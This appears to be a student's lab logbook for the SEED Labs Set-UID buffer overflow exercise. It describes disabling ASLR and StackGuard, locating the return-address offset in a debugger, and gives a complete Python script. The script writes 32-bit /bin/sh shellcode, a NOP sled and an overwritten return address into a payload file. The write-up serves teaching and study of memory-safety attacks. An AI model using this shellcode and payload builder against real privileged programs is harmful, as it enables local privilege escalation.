**Week #5** 

### **SEEDs Lab**
Buffer Overflow Attack Lab (Set-UID Version)

- First we turned off the linux countermeasures, such as Address Space Randomization using the command shown on the lab guide, and then configured the /bin/sh so that the shell allows for Set-UID program attacks

![Terminal print countermeasures](/images/Logbook5%20images/countermeasures.png)


### **Task 1: Getting Familiar with Shellcode** 

- Compiled and ran the program 
- Both 32-bit and 64-bit versions granted us access to the shell

![Terminal print task1](/images/Logbook5%20images/task1.png)


### **Task 2: Understanding the Vulnerable Program** 

- Compiled the program using **make**, which ran a makefile already configured to compile the program with the correct flags to enable the attack, such as turning off the StackGuard, and running the commands to make the program Set-UID
- Checked the permissions of the resulting programs, confirming the Set-UID bit

![Terminal print task2](/images/Logbook5%20images/task2.png)


### **Task 3: Launching Attack on 32-bit Program (Level 1)** 

- First ran the debug version of the program to understand the locations of each variable in the Stack. We used a break point in the function where the overflow is possible to analyze the addresses at that point in the program execution

![Terminal print task3](/images/Logbook5%20images/task31.png)

![Terminal print task3](/images/Logbook5%20images/task32.png)

Then, changed the variables in the python script. This script will output to a file the contents to be written on the buffer to overflow

- Changed the offset to 112, which is the distance between the start of the buffer and the return address that we want to rewrite (ebp - buffer) + 4bits = 108 + 4 = 112 

- Changed the ret value to the address to which we want the program to jump to

- Changed the start value to match the start of the shellcode in the buffer with the position the program is going to jump to

**Python Script**

``` python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517- len(shellcode)               # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0xffffcabc     # Change this number
offset = 112           # Change this number

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
```

